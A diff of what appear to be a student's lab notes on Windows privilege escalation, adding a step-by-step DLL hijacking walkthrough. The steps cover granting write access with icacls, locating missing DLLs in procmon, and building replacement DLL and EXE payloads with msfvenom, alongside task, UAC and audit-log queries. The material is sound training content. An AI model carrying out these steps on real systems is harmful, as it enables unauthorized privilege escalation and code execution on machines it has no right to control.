@@ -1,4 +1,4 @@
-# Windows
+### Windows
 #### Scheduled Tasks and Services
 * Write Permissions
 * Non-Standard Locactions
@@ -6,6 +6,8 @@
 * Vulnerabilities in Executables
 * Permissions to Run as `SYSTEM`
 #### DEMO: Finding vulnerable Scheduled Tasks
+schtasks /query /fo LIST /v
+
 ##### DLL Stuff
 * Can you rename the file?
 * Can you write to the directory?
@@ -32,8 +34,37 @@ auditpol /get /category:* | findstr /i "success failure"
 * 4672 - Adminstrative User logged on
 * 7045 - Service Created
 
-# Linux
-#### Resources
+# checking UAC settings
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+./sigcheck.exe -m -accepteula 
+
+## DLL hijacking method demo    use when youre on a target machine 
+1. create a task called "putty.exe"
+2. icacls "C:\program files (x86)\putty" /grant BUILTIN\users:W
+3. net use Z: "\\http://live.sysinternals.com" /persistent:yes
+4. Z:\>   ./procmon.exe -accepteula
+    once opened look for process name contains putty.exe
+    then path contains dll
+    then result is NAME NOT FOUND
+5. if nothing populates then run in ps : (get-process | ?{$_.name -like "putty"}).kill() and restart process 
+5a. if something is found find a dll like in this demo SSPIC.DLL
+then you do:
+6. on linops**    msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
+7. on ps:
+    scp student@<linops>:/path/payload/inside/WinPRivEsc/SSPICLI.dll "C:\program files (x86)\putty\SSPICLI.dll"
+8. then run putty.exe or whatever executable you use, should write on notepad the result of the command you msfvenom'd 
+
+## EXE replacement 
+msfvenom: msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
+
+ ## audit logging 
+ auditpol /get /category:*
+ auditpol /get /category:* | findstr /i "success failure"
+
+
+    
+#### Linux
+### Resources
 * [GTFOBins](https://gtfobins.github.io)
 #### Sudo Gotchas!
 * Commands that can access the contents of other files
